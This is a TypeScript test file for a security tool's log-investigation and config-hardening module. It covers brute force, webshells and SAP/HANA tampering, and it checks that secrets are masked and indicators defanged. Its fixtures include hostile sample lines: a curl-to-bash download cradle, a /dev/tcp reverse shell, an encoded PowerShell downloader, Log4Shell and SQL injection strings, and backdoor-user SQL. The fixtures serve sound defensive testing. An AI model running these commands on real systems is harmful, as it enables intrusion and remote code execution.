// Security lane tests: routing, indicators, the investigation detectors, the
// config checks with their exact fixes, and the hygiene rules (indicators
// defanged, secrets masked) that every report must keep.

import { describe, it, expect } from "vitest";
import {
  decodePowerShell,
  defang,
  detectConfigType,
  detectSecurityRequest,
  extractIndicators,
  findSecrets,
  genericSecurityPrompt,
  hardeningGuidePrompt,
  hardeningReview,
  hardeningTopic,
  investigate,
  isPrivateIp,
  looksLikeLogs,
  maskSecrets,
  parseTimestamp,
  patchSshd,
  renderSecurityMarkdown,
  securityPrompt,
} from "../lib/securityLane";

const utf16b64 = (s: string) => btoa([...s].map((c) => String.fromCharCode(c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8)).join(""));

const AUTH_LOG = [
  ...Array.from({ length: 30 }, (_, i) => `Oct  4 03:1${Math.floor(i / 10)}:${String(i % 60).padStart(2, "0")} web01 sshd[2211]: Failed password for ${i % 2 ? "root" : "invalid user admin"} from 203.0.113.50 port 51${i} ssh2`),
  "Oct  4 03:14:02 web01 sshd[2290]: Accepted password for deploy from 203.0.113.50 port 51999 ssh2",
  "Oct  4 03:15:10 web01 useradd[2301]: new user: name=backup2, UID=1002, GID=1002, home=/home/backup2",
  "Oct  4 03:15:20 web01 usermod[2302]: add 'backup2' to group 'sudo'",
  "Oct  4 03:16:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e",
  "Oct  4 03:16:30 web01 bash[2310]: curl -s http://evil.example.xyz/x.sh | bash",
  "Oct  4 03:17:00 web01 bash[2311]: bash -i >& /dev/tcp/198.51.100.23/4444 0>&1",
  "Oct  4 03:18:00 web01 bash[2312]: history -c",
  "Oct  4 03:18:30 web01 sshd[2400]: Accepted publickey for ops from 10.0.0.5 port 40100 ssh2",
].join("\n");

const ACCESS_LOG = [
  '198.51.100.9 - - [04/Oct/2026:09:00:01 +0000] "GET /products?id=1%27%20union%20select%20password%20from%20users-- HTTP/1.1" 200 5123 "-" "sqlmap/1.8"',
  '198.51.100.9 - - [04/Oct/2026:09:00:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 120 "-" "sqlmap/1.8"',
  '198.51.100.9 - - [04/Oct/2026:09:00:03 +0000] "GET /?x=${jndi:ldap://bad.example.top/a} HTTP/1.1" 400 0 "-" "curl/8"',
  '203.0.113.77 - - [04/Oct/2026:09:01:00 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
  '192.168.1.20 - - [04/Oct/2026:09:02:00 +0000] "GET /index.html HTTP/1.1" 200 900 "-" "Mozilla/5.0"',
].join("\n");

describe("routing", () => {
  it("investigates logs and hardens configs, by words or by what was attached", () => {
    expect(detectSecurityRequest("investigate this", AUTH_LOG)).toBe("investigate");
    expect(detectSecurityRequest("what happened here?", AUTH_LOG)).toBe("investigate");
    expect(detectSecurityRequest("summarize these logs", AUTH_LOG)).toBe("investigate");
    expect(detectSecurityRequest("harden this", "PermitRootLogin yes\nPasswordAuthentication yes")).toBe("harden");
    expect(detectSecurityRequest("review my sshd config", "PermitRootLogin yes\nPasswordAuthentication yes")).toBe("harden");
    expect(detectSecurityRequest("summarize this file", "FROM node:latest\nRUN npm i")).toBeNull(); // summarising a config is not a review
    expect(detectSecurityRequest("summarize this document", "Quarterly results were strong across regions.")).toBeNull();
  });

  it("answers 'harden my X' with a guide, and leaves ordinary chat alone", () => {
    expect(detectSecurityRequest("how do I harden my postgres server?")).toBe("harden");
    expect(hardeningTopic("harden my postgres server")).toBe("postgres");
    expect(hardeningTopic("lock down my home wifi router")).toBe("router");
    expect(detectSecurityRequest("make my AWS account more secure")).toBe("harden");
    expect(detectSecurityRequest("write a poem about servers")).toBeNull();
    expect(detectSecurityRequest("harden")).toBeNull(); // no topic, no material
  });

  it("recognises every supported config format", () => {
    expect(detectConfigType("Port 22\nPermitRootLogin no\n")).toBe("sshd");
    expect(detectConfigType("server {\n listen 80;\n server_name a.com;\n location / {}\n}")).toBe("nginx");
    expect(detectConfigType("FROM python:3.12\nRUN pip install x\nCMD [\"x\"]")).toBe("dockerfile");
    expect(detectConfigType("services:\n  web:\n    image: nginx\n")).toBe("compose");
    expect(detectConfigType("apiVersion: apps/v1\nkind: Deployment\n")).toBe("kubernetes");
    expect(detectConfigType("DB_PASSWORD=x\nAPI_KEY=y\n")).toBe("dotenv");
    expect(detectConfigType('{"name":"a","dependencies":{"x":"*"}}')).toBe("npm");
    expect(detectConfigType("on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n")).toBe("github-actions");
    expect(detectConfigType("just some prose about security")).toBeNull();
    expect(looksLikeLogs(AUTH_LOG)).toBe(true);
    expect(looksLikeLogs("one line\nanother line\nand a third")).toBe(false);
  });
});

describe("hygiene", () => {
  it("defangs indicators and masks secrets", () => {
    expect(defang("http://evil.example.xyz/x 203.0.113.50 a@b.com")).toBe("hxxp://evil.example[.]xyz/x 203.0.113[.]50 a[@]b[.]com");
    const masked = maskSecrets("key AKIAABCDEFGHIJKLMNOP and password=hunter2hunter2 and ghp_abcdefghijklmnopqrstuvwxyz0123456789");
    expect(masked).not.toContain("ABCDEFGHIJKLMNOP");
    expect(masked).not.toContain("hunter2hunter2");
    expect(masked).not.toContain("abcdefghijklmnopqrstuvwxyz0123456789");
    expect(findSecrets("-----BEGIN OPENSSH PRIVATE KEY-----")).toContain("private key");
    expect(isPrivateIp("10.1.2.3")).toBe(true);
    expect(isPrivateIp("172.20.0.1")).toBe(true);
    expect(isPrivateIp("8.8.8.8")).toBe(false);
  });

  it("leaves sudo's working directory readable but still masks a pwd that is a password", () => {
    expect(maskSecrets("sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id")).toContain("PWD=/home/deploy");
    expect(maskSecrets("db_pwd=hunter22 password: 'letmein99'")).toBe("db_pwd=hu**** password: 'le****'");
  });

  it("reads the common timestamp formats", () => {
    expect(parseTimestamp("2026-10-04T09:00:01Z event", 2026)).toBe(Date.UTC(2026, 9, 4, 9, 0, 1));
    expect(parseTimestamp('1.2.3.4 - - [04/Oct/2026:09:00:01 +0200] "GET /"', 2026)).toBe(Date.UTC(2026, 9, 4, 7, 0, 1));
    expect(parseTimestamp("Oct  4 03:14:02 web01 sshd", 2026)).toBe(Date.UTC(2026, 9, 4, 3, 14, 2));
    expect(parseTimestamp("10/4/2026 3:14:02 PM An account failed", 2026)).toBe(Date.UTC(2026, 9, 4, 15, 14, 2));
    expect(parseTimestamp("no time here", 2026)).toBeNull();
  });
});

describe("investigation", () => {
  it("finds the brute force, the success that followed, and what the intruder did", () => {
    const r = investigate(AUTH_LOG, "auth.log", 2026);
    const ids = r.findings.map((f) => f.id);
    expect(ids).toContain("success-after-failure");
    expect(ids).toContain("brute-force-203.0.113.50");
    expect(ids).toEqual(expect.arrayContaining(["new-account", "admin-group", "download-cradle", "reverse-shell", "log-clearing", "sudo"]));
    expect(r.findings[0].severity).toBe("critical");
    const brute = r.findings.find((f) => f.id.startsWith("brute-force"))!;
    expect(brute.count).toBe(30);
    expect(brute.attack?.id).toBe("T1110.001");
    expect(r.timeline.first).toBe("2026-10-04T03:10:00Z");
    expect(r.timeline.last).toBe("2026-10-04T03:18:30Z");
    expect(r.indicators.ipsPublic).toEqual(expect.arrayContaining(["203.0.113.50", "198.51.100.23"]));
    expect(r.indicators.ipsPrivate).toContain("10.0.0.5");
    expect(r.indicators.users).toEqual(expect.arrayContaining(["root", "admin", "deploy", "ops"]));
    // Evidence is defanged: nothing in the report is clickable.
    for (const f of r.findings) for (const e of f.evidence) expect(e).not.toMatch(/https?:\/\//);
  });

  it("catches group changes and crontab edits in the forms admins actually type", () => {
    const has = (line: string, id: string) => investigate(line, "x.log", 2026).findings.some((f) => f.id === id);
    // usermod as typed: -aG, -a -G, --groups=, and the gpasswd / adduser spellings
    for (const cmd of [
      "COMMAND=/usr/sbin/usermod -aG sudo svc-backup",
      "COMMAND=/usr/sbin/usermod -a -G wheel ops2",
      "COMMAND=/usr/sbin/usermod --append --groups=docker,sudo ops3",
      "COMMAND=/usr/bin/gpasswd -a ops4 sudo",
      "COMMAND=/usr/sbin/adduser ops5 admin",
    ]) expect(has(`Oct  5 01:14:55 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; ${cmd}`, "admin-group")).toBe(true);
    // ...but not an ordinary group, and not a user merely named "sudo-docs"
    expect(has("Oct  5 01:14:55 web01 sudo: deploy : USER=root ; COMMAND=/usr/sbin/usermod -aG docker ops", "admin-group")).toBe(false);
    // crontab's own syslog lines, and a crontab installed from a pipe
    expect(has("Oct  5 01:15:40 web01 crontab[22044]: (deploy) REPLACE (deploy)", "persistence-cron")).toBe(true);
    expect(has("Oct  5 01:15:40 web01 crontab[22045]: (root) BEGIN EDIT (root)", "persistence-cron")).toBe(true);
    expect(has("Oct  5 01:15:41 web01 bash[22046]: (crontab -l; echo '*/10 * * * * /tmp/.x') | crontab -", "persistence-cron")).toBe(true);
    // listing a crontab is not a change
    expect(has("Oct  5 01:15:42 web01 crontab[22047]: (deploy) LIST (deploy)", "persistence-cron")).toBe(false);
  });

  it("flags web attacks, and escalates the one that got a 200", () => {
    const r = investigate(ACCESS_LOG, "access.log", 2026);
    const titles = r.findings.map((f) => f.title).join(" | ");
    expect(r.findings.find((f) => f.id === "web-sqli")?.severity).toBe("critical"); // answered with 200
    expect(titles).toMatch(/answered with 200/);
    expect(titles).toMatch(/Log4Shell/);
    expect(titles).toMatch(/Path traversal/);
    expect(titles).toMatch(/scanner/i);
    expect(titles).toMatch(/sensitive files/);
  });

  it("decodes encoded PowerShell and catches Windows events", () => {
    const cmd = "IEX (New-Object Net.WebClient).DownloadString('http://bad.example.top/a')";
    expect(decodePowerShell(utf16b64(cmd))).toBe(cmd);
    const win = [
      ...Array.from({ length: 12 }, (_, i) => `2026-10-04T10:00:${String(i).padStart(2, "0")}Z EventID=4625 An account failed to log on. Source Network Address: 198.51.100.7 Account Name: svc_sql`),
      "2026-10-04T10:01:00Z EventID=4624 An account was successfully logged on. Source Network Address: 198.51.100.7 Account Name: svc_sql",
      "2026-10-04T10:02:00Z EventID=4720 A user account was created. Account Name: helpdesk2",
      "2026-10-04T10:02:30Z EventID=4732 A member was added to a security-enabled local group. Group: Administrators",
      `2026-10-04T10:03:00Z EventID=4688 New process: powershell.exe -nop -w hidden -enc ${utf16b64(cmd)}`,
      "2026-10-04T10:04:00Z EventID=1102 The audit log was cleared.",
    ].join("\n");
    const r = investigate(win, "security.evtx.txt", 2026);
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(["success-after-failure", "new-account", "admin-group", "encoded-powershell", "log-clearing"]));
    expect(r.findings.find((f) => f.id === "encoded-powershell")?.detail).toMatch(/Decoded: IEX \(New-Object Net\.WebClient\)\.DownloadString\('hxxp:\/\/bad\.example\[\.\]top\/a'\)/);
  });

  it("pulls every indicator type", () => {
    const i = extractIndicators("hash 44d88612fea8a8f36de82e1278abb02f and e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 from evil.example.ru mail bob@corp.example.com see CVE-2021-44228 dropped /tmp/.x/payload.sh and C:\\Users\\Public\\run.exe");
    expect(i.md5).toEqual(["44d88612fea8a8f36de82e1278abb02f"]);
    expect(i.sha256).toHaveLength(1);
    expect(i.domains).toContain("evil.example.ru");
    expect(i.emails).toEqual(["bob@corp.example.com"]);
    expect(i.cves).toEqual(["CVE-2021-44228"]);
    expect(i.paths).toEqual(expect.arrayContaining(["/tmp/.x/payload.sh", "C:\\Users\\Public\\run.exe"]));
  });

  it("briefs the model with evidence only, and renders a defanged report", () => {
    const r = investigate(AUTH_LOG, "auth.log", 2026);
    const p = securityPrompt(r, "what happened on web01?");
    expect(p).toContain("User request: what happened on web01?");
    expect(p).toContain("[CRITICAL] Login succeeded from a source that was guessing passwords");
    expect(p).toContain("203.0.113[.]50");
    expect(p).not.toMatch(/\b203\.0\.113\.50\b/);
    expect(p).toContain("Contain now");
    const md = renderSecurityMarkdown(r, "## What happened\nAn attacker guessed deploy's password.", "qwen3.8:27b");
    expect(md).toContain("# Investigation: auth.log");
    expect(md).toContain("| Severity | Finding | ATT&CK | Evidence |");
    expect(md).toContain("## Indicators (defanged)");
    expect(md).not.toMatch(/http:\/\/evil/);
  });
});

describe("hardening configs", () => {
  const SSHD = ["Port 22", "PermitRootLogin yes", "PasswordAuthentication yes", "X11Forwarding yes", "Ciphers aes128-cbc,aes256-ctr", "Match User backup", "  PasswordAuthentication yes"].join("\n");

  it("checks sshd and patches it, leaving Match blocks alone", () => {
    const r = hardeningReview(SSHD, "sshd_config")!;
    expect(r.configType).toBe("sshd");
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(["ssh-root", "ssh-passwords", "ssh-x11", "ssh-weak-ciphers", "ssh-allowlist"]));
    expect(r.findings.find((f) => f.id === "ssh-passwords")?.fix).toBe("PasswordAuthentication no");
    const patched = patchSshd(SSHD);
    expect(patched).toMatch(/^PermitRootLogin no {3}# hardened by PrismOS \(was: yes\)$/m);
    expect(patched).toMatch(/^PasswordAuthentication no/m);
    expect(patched).toContain("MaxAuthTries 3");
    expect(patched.indexOf("MaxAuthTries 3")).toBeLessThan(patched.indexOf("Match User backup"));
    expect(patched).toContain("Match User backup\n  PasswordAuthentication yes");
    expect(r.patched).toBe(patched);
  });

  it("checks nginx: TLS, headers, dotfiles, listings", () => {
    const r = hardeningReview("server {\n listen 80;\n server_name shop.example.com;\n autoindex on;\n ssl_protocols TLSv1 TLSv1.2;\n location / { root /var/www; }\n}", "nginx.conf")!;
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining(["nginx-tls", "nginx-https", "nginx-headers", "nginx-autoindex", "nginx-dotfiles", "nginx-tokens"]));
    expect(r.findings.find((f) => f.id === "nginx-headers")?.fix).toContain("add_header Strict-Transport-Security");
  });

  it("checks Dockerfiles, compose files and Kubernetes manifests", () => {
    const d = hardeningReview("FROM node:latest\nENV API_KEY=abc123secret\nADD https://x.example.com/t.tgz /tmp/\nRUN curl -s https://get.example.com | sh\nEXPOSE 22\nCMD [\"node\",\"a.js\"]", "Dockerfile")!;
    expect(d.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["docker-root", "docker-unpinned-node:latest", "docker-secret", "docker-add-url", "docker-curl-sh", "docker-ssh"]));
    expect(d.findings[0].severity).toBe("critical");
    for (const f of d.findings) for (const e of f.evidence) expect(e).not.toContain("abc123secret");

    const c = hardeningReview("services:\n  db:\n    image: postgres\n    ports:\n      - \"5432:5432\"\n    environment:\n      POSTGRES_PASSWORD: supersecret\n  agent:\n    image: tool:latest\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    network_mode: host\n", "docker-compose.yml")!;
    expect(c.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["compose-privileged", "compose-docker-sock", "compose-host-net", "compose-db-exposed", "compose-secrets", "compose-latest"]));

    const k = hardeningReview("apiVersion: v1\nkind: Pod\nspec:\n  hostNetwork: true\n  containers:\n    - name: app\n      image: app:latest\n      securityContext:\n        privileged: true\n      env:\n        - name: DB_PASSWORD\n          value: hunter2\n  volumes:\n    - name: h\n      hostPath:\n        path: /\n", "pod.yaml")!;
    expect(k.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["k8s-privileged", "k8s-hostnetwork", "k8s-hostpath", "k8s-root", "k8s-limits", "k8s-latest", "k8s-secret-env"]));
  });

  it("never repeats a secret from a .env, and catches debug mode", () => {
    const env = "AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\nDB_PASSWORD=short\nDEBUG=true\nNODE_ENV=development\n";
    const r = hardeningReview(env, ".env")!;
    expect(r.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["env-secrets", "env-weak-password", "env-debug"]));
    const all = JSON.stringify(r) + renderSecurityMarkdown(r, "verdict", "m");
    expect(all).not.toContain("ABCDEFGHIJKLMNOP");
    expect(all).not.toMatch(/DB_PASSWORD=short/);
  });

  it("checks package.json and GitHub Actions workflows", () => {
    const n = hardeningReview('{"scripts":{"postinstall":"curl -s https://x.example.com/i.sh | sh"},"dependencies":{"left-pad":"*","lib":"http://example.com/lib.tgz"}}', "package.json")!;
    expect(n.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["npm-script-postinstall", "npm-unpinned", "npm-http", "npm-audit"]));
    const g = hardeningReview("on: pull_request_target\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - uses: some/action@v1\n      - run: echo \"${{ github.event.pull_request.title }}\"\n", ".github/workflows/ci.yml")!;
    expect(g.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["gha-prt-checkout", "gha-permissions", "gha-unpinned", "gha-injection"]));
  });

  it("briefs the model with the exact fixes, and guides platforms without a file", () => {
    const r = hardeningReview(SSHD, "sshd_config")!;
    const p = securityPrompt(r, "harden this");
    expect(p).toContain("SSH server (sshd_config)");
    expect(p).toContain("fix: PasswordAuthentication no");
    const md = renderSecurityMarkdown(r, "Verdict: fix the password logins first.", "qwen3.8:27b");
    expect(md).toContain("## Exact fixes");
    const guide = hardeningGuidePrompt("postgres", "harden my postgres");
    expect(guide).toContain("pg_hba.conf: scram-sha-256");
    expect(guide).toContain("how to verify it worked");
    expect(genericSecurityPrompt("const key = 'AKIAABCDEFGHIJKLMNOP';", "review this for security")).not.toContain("ABCDEFGHIJKLMNOP");
  });
});

// ── SAP: NetWeaver, Security Audit Log, SAP HANA ─────────────────────────────

const SAP_LOG = [
  '203.0.113.47 - - [05/Oct/2026:01:03:12 +0000] "POST /developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1 HTTP/1.1" 200 312 "-" "python-requests/2.31"',
  '203.0.113.47 - - [05/Oct/2026:01:04:00 +0000] "GET /irj/helper.jsp?cmd=whoami HTTP/1.1" 200 64 "-" "curl/8"',
  "Oct  5 01:05:10 sapjava01 bash[4410]: cat /usr/sap/PRD/SYS/global/security/data/SecStore.properties",
  "Oct  5 01:05:20 sapjava01 find[4411]: /usr/sap/PRD/J00/j2ee/cluster/apps/sap.com/irj/servlet_jsp/irj/root/cglswdjp.jsp",
  "2026-10-05 01:06:00;indexserver;hana01;PRD;00;30015;PRD;10.0.0.5;app01;4242;51000;_SAP_user administration;INFO;CREATE USER;ADMIN2;;;;;;;SUCCESSFUL;;;;;;;CREATE USER BACKDOOR PASSWORD Winter2026x NO FORCE_FIRST_PASSWORD_CHANGE;400123;",
  "2026-10-05 01:06:30;indexserver;hana01;PRD;00;30015;PRD;10.0.0.5;app01;4242;51000;_SAP_authorizations;INFO;GRANT PRIVILEGE;ADMIN2;;;;;;;SUCCESSFUL;;;;;;;GRANT USER ADMIN, ROLE ADMIN TO BACKDOOR WITH ADMIN OPTION;400124;",
  "2026-10-05 01:07:00;nameserver;hana01;PRD;00;30013;SYSTEMDB;10.0.0.5;app01;4242;51000;_SAP_configuration changes;INFO;SYSTEM CONFIGURATION CHANGE;ADMIN2;;;;;;;SUCCESSFUL;;;;;;;ALTER SYSTEM ALTER CONFIGURATION ('global.ini','SYSTEM') SET ('auditing configuration','global_auditing_state') = 'false' WITH RECONFIGURE;400125;",
  "2026-10-05 01:07:30;indexserver;hana01;PRD;00;30015;PRD;10.0.0.5;app01;4242;51000;_SAP_user administration;INFO;ALTER USER;ADMIN2;;;;;;;SUCCESSFUL;;;;;;;ALTER USER SYSTEM ACTIVATE USER NOW;400126;",
  "2026-10-05 01:08:00;indexserver;hana01;PRD;00;30015;PRD;10.0.0.5;app01;4242;51000;_SAP_recover database;INFO;BACKUP CATALOG DELETE;ADMIN2;;;;;;;SUCCESSFUL;;;;;;;BACKUP CATALOG DELETE ALL BEFORE BACKUP_ID 1790000000000 WITH FILE;400127;",
  "05.10.2026 01:09:00 AU7 ADMIN2 SU01 User HACKER created",
  "05.10.2026 01:09:30 AUB ADMIN2 SU01 Authorizations for user HACKER changed",
  "05.10.2026 01:10:00 AUE ADMIN2 RSAU_CONFIG Audit configuration changed",
  "05.10.2026 01:11:00 CUL ADMIN2 SE38 Field content changed in the debugger: SY-SUBRC",
  "05.10.2026 01:12:00 DU9 ADMIN2 SE16N Generic table access: tables USR02",
].join("\n");

const PROFILE = [
  "SAPSYSTEMNAME = PRD",
  "SAPGLOBALHOST = sapprd01",
  "login/min_password_lng = 6",
  "login/no_automatic_user_sapstar = 0",
  "login/fails_to_user_lock = 10",
  "login/password_downwards_compatibility = 1",
  "auth/rfc_authority_check = 0",
  "gw/acl_mode = 0",
  "gw/sim_mode = 1",
  "gw/reg_no_conn_info = 1",
  "ms/admin_port = 3901",
  "rdisp/gui_auto_logout = 0",
  "icm/server_port_0 = PROT=HTTP,PORT=8000",
].join("\n");

const HANA_INI = [
  "[auditing configuration]",
  "global_auditing_state = false",
  "default_audit_trail_type = CSVTEXTFILE",
  "",
  "[password policy]",
  "minimal_password_length = 6",
  "maximum_invalid_connect_attempts = 20",
  "password_lock_time = 0",
  "force_first_password_change = false",
  "password_lock_for_system_user = false",
  "",
  "[persistence]",
  "log_mode = overwrite",
  "enable_auto_log_backup = no",
].join("\n");

describe("SAP", () => {
  it("finds the Visual Composer path, portal webshells, SecStore reads and SAP HANA audit evidence", () => {
    const r = investigate(SAP_LOG, "sap-night.log", 2026);
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining([
      "sap-vc-uploader", "sap-irj-webshell", "sap-secstore", "db-new-user", "db-powerful-grant",
      "db-audit-weakened", "hana-system-activated", "db-backup-delete",
      "sap-sal-user-created", "sap-sal-auth-changed", "sap-sal-audit-changed", "sap-sal-debug", "sap-sal-table-access",
    ]));
    const byId = (id: string) => r.findings.find((f) => f.id === id)!;
    expect(byId("sap-vc-uploader").severity).toBe("critical");
    expect(byId("sap-vc-uploader").attack?.id).toBe("T1190");
    expect(byId("sap-irj-webshell").attack?.id).toBe("T1505.003");
    expect(byId("sap-irj-webshell").count).toBe(2); // the request and the file on disk
    expect(byId("db-audit-weakened").attack?.tactic).toBe("Defense Impairment");
    // the password in CREATE USER never reaches the report
    const evidence = r.findings.flatMap((f) => f.evidence).join("\n");
    expect(evidence).not.toContain("Winter2026x");
    expect(evidence).toContain("PASSWORD Wi****");
  });

  it("stays quiet on ordinary logs and keeps everyday words readable", () => {
    const ids = investigate(AUTH_LOG, "auth.log", 2026).findings.map((f) => f.id);
    expect(ids.some((id) => /^(sap|db|hana)-/.test(id))).toBe(false);
    expect(maskSecrets("Failed password for root from 203.0.113.5")).toBe("Failed password for root from 203.0.113.5");
    expect(maskSecrets("ALTER USER BOB DISABLE PASSWORD LIFETIME")).toBe("ALTER USER BOB DISABLE PASSWORD LIFETIME");
    expect(maskSecrets("CREATE USER 'bob'@'%' IDENTIFIED BY 'hunter22'")).not.toContain("hunter22");
  });

  it("checks an SAP instance profile against the baseline, with exact fixes", () => {
    expect(detectConfigType(PROFILE, "DEFAULT.PFL")).toBe("sap-profile");
    expect(detectConfigType(PROFILE)).toBe("sap-profile");
    expect(detectConfigType(PROFILE, "PRD_D00_sapapp1")).toBe("sap-profile");
    const r = hardeningReview(PROFILE, "DEFAULT.PFL")!;
    const ids = r.findings.map((f) => f.id);
    expect(ids).toEqual(expect.arrayContaining([
      "sap-pw-length", "sap-sapstar", "sap-lock-attempts", "sap-pw-legacy", "sap-rfc-auth", "sap-gw-acl",
      "sap-gw-sim", "sap-gw-bits", "sap-ms-admin-port", "sap-gui-timeout", "sap-sal-off", "sap-snc",
    ]));
    const fix = (id: string) => r.findings.find((f) => f.id === id)!.fix;
    expect(fix("sap-gw-bits")).toBe("gw/reg_no_conn_info = 15");
    expect(fix("sap-sapstar")).toBe("login/no_automatic_user_sapstar = 1");
    expect(r.findings[0].severity).toBe("high");
    expect(ids).not.toContain("sap-sal-integrity"); // only once the audit log is on
    const good = hardeningReview("SAPSYSTEMNAME = PRD\nlogin/min_password_lng = 12\nrsau/enable = 1\nrsau/integrity = 1\nrsau/log_peer_address = 1\nsnc/enable = 1\ngw/acl_mode = 1", "DEFAULT.PFL")!;
    expect(good.findings).toEqual([]);
    const sal = hardeningReview("SAPSYSTEMNAME = PRD\nrsau/enable = 1\nsnc/enable = 1\nlogin/min_password_lng = 8", "DEFAULT.PFL")!;
    expect(sal.findings.map((f) => f.id)).toEqual(expect.arrayContaining(["sap-sal-integrity", "sap-sal-peer"]));
  });

  it("checks SAP HANA ini files: auditing, password policy, recovery", () => {
    expect(detectConfigType(HANA_INI, "global.ini")).toBe("hana-ini");
    expect(detectConfigType(HANA_INI)).toBe("hana-ini");
    const r = hardeningReview(HANA_INI, "global.ini")!;
    expect(r.findings.map((f) => f.id)).toEqual(expect.arrayContaining([
      "hana-audit-off", "hana-csv-trail-default_audit_trail_type", "hana-pw-length", "hana-lock-attempts", "hana-lock-time",
      "hana-first-change", "hana-system-lock", "hana-log-overwrite", "hana-log-backup-off",
    ]));
    expect(r.findings.find((f) => f.id === "hana-audit-off")!.fix).toBe("[auditing configuration]\nglobal_auditing_state = true");
    expect(hardeningReview("[password policy]\nminimal_password_length = 12\n[auditing configuration]\nglobal_auditing_state = true", "indexserver.ini")!.findings).toEqual([]);
  });

  it("routes SAP files and plans, and grounds SAP, HANA and BTP hardening plans", () => {
    expect(detectSecurityRequest("review this profile", PROFILE)).toBe("harden");
    expect(detectSecurityRequest("what happened on our SAP system last night?", SAP_LOG)).toBe("investigate");
    expect(hardeningTopic("harden my SAP HANA database")).toBe("hana");
    expect(hardeningTopic("harden our S/4HANA system")).toBe("sap");
    expect(hardeningTopic("secure my sap btp subaccount")).toBe("btp");
    expect(hardeningTopic("harden my sap system")).toBe("sap");
    expect(hardeningTopic("harden my postgres server")).toBe("postgres");
    expect(hardeningGuidePrompt("sap", "harden my sap system")).toContain("rsau/enable = 1");
    expect(hardeningGuidePrompt("hana", "harden hana")).toContain("SAP Note 2493657");
    expect(hardeningGuidePrompt("btp", "harden btp")).toContain("principal propagation");
  });

  it("masks quoted passwords that contain spaces or punctuation", () => {
    const sql = maskSecrets(`CREATE USER bob PASSWORD "Secr3t,Pass" NO FORCE_FIRST_PASSWORD_CHANGE;`);
    expect(sql).not.toContain("Secr3t,Pass");
    expect(sql).toContain(`PASSWORD "Se****"`);
    expect(maskSecrets(`password: "my secret pass"`)).toBe(`password: "my****"`);
    expect(maskSecrets("IDENTIFIED BY 'a b;c'")).toBe("IDENTIFIED BY 'a ****'");
    expect(maskSecrets("password=hunter22 user=bob")).toBe("password=hu**** user=bob");
  });

  it("stays fast on long hostile lines", () => {
    const started = Date.now();
    investigate(`ALTER SYSTEM ALTER CONFIGURATION SET global_auditing_state${" ".repeat(40_000)}x`, "audit.log");
    investigate(`CREATE USER ${"a@".repeat(20_000)}`, "audit.log");
    maskSecrets(`password="${"x".repeat(50_000)}`);
    expect(Date.now() - started).toBeLessThan(1500);
  });

  it("needs SAP content before it treats a file as an SAP profile or a HANA ini", () => {
    const yaml = "server:\n  port: 8080\nlogging:\n  level: info\n";
    expect(detectConfigType(yaml, "prd_app01_settings.yaml")).not.toBe("sap-profile");
    expect(detectConfigType("[core]\ntheme = dark\n", "global.ini")).toBeNull();
    expect(detectConfigType("rdisp/gui_auto_logout = 3600\n", "PRD_D00_sapapp1")).toBe("sap-profile");
  });

  it("treats a parameter missing from an instance profile as a hint, and from DEFAULT.PFL as a finding", () => {
    const text = "SAPSYSTEMNAME = PRD\nINSTANCE_NAME = D00\nrdisp/gui_auto_logout = 3600\n";
    const instance = hardeningReview(text, "PRD_D00_sapapp1")!.findings.find((f) => f.id === "sap-sal-off")!;
    expect(instance.severity).toBe("low");
    expect(instance.title).toContain("unless DEFAULT.PFL sets it");
    expect(hardeningReview(text, "DEFAULT.PFL")!.findings.find((f) => f.id === "sap-sal-off")!.severity).toBe("high");
  });
});
